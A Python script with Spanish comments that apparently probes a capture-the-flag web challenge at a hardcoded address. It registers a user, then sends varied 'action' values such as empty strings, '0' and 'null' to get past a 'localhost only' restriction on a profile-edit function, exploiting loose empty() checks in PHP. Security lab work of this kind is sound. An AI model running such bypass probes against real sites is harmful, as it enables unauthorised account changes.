#!/usr/bin/env python3
import requests
import random
import string
import re

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'testuser', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Ver respuesta normal
print("[*] Respuesta sin action:")
resp1 = session.get(f"{TARGET}/")
match1 = re.search(r'Yo, ([^<]+)</h2>', resp1.text)
if match1:
    print(f"    Nombre: {match1.group(1)}")
print(f"    Longitud: {len(resp1.text)}")

# Con action vacío via POST
print("\n[*] Respuesta con action='' via POST:")
resp2 = session.post(f"{TARGET}/", data={'action': ''})
match2 = re.search(r'Yo, ([^<]+)</h2>', resp2.text)
if match2:
    print(f"    Nombre: {match2.group(1)}")
print(f"    Longitud: {len(resp2.text)}")

# Con action vacío via GET
print("\n[*] Respuesta con action='' via GET:")
resp3 = session.get(f"{TARGET}/?action=")
match3 = re.search(r'Yo, ([^<]+)</h2>', resp3.text)
if match3:
    print(f"    Nombre: {match3.group(1)}")
print(f"    Longitud: {len(resp3.text)}")

# Comparar
if resp1.text == resp2.text:
    print("\n[=] Respuesta sin action == action vacío POST")
else:
    print("\n[!] Respuestas DIFERENTES entre sin action y action vacío POST")
    
if resp1.text == resp3.text:
    print("[=] Respuesta sin action == action vacío GET")
else:
    print("[!] Respuestas DIFERENTES entre sin action y action vacío GET")

# Ver el código de index.php
print("\n[*] Análisis de index.php:")
print("    - if(empty($action)) => ejecuta searchUser")
print("    - elseif($action == 'edit') => requiere localhost")
print("    - else => ???")
print("\n    $_REQUEST['action'] captura tanto GET como POST")
print("    empty('') es TRUE en PHP")

# Probar con diferentes valores 
print("\n[*] Probando diferentes payloads de action:")
test_actions = [
    ('edit', 'new_name', 'CHANGED'),
    ('', 'new_name', 'CHANGED2'),
    ('0', 'new_name', 'CHANGED3'),
    ('false', 'new_name', 'CHANGED4'),
    ('null', 'new_name', 'CHANGED5'),
]

for action, param, value in test_actions:
    print(f"\n[*] action={repr(action)}, {param}={value}")
    resp = session.post(f"{TARGET}/", data={'action': action, param: value})
    
    if "Only localhost" in resp.text:
        print(f"    [-] Only localhost")
    elif "Done!" in resp.text:
        print(f"    [+++] Done! - Cambio exitoso")
    elif "Failed!" in resp.text:
        print(f"    [-] Failed")
    else:
        # Buscar el nombre actual
        match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
        if match:
            name = match.group(1)
            if name != 'testuser':
                print(f"    [!] Nombre cambió a: {name}")
            else:
                print(f"    [=] Nombre sigue igual: {name}")
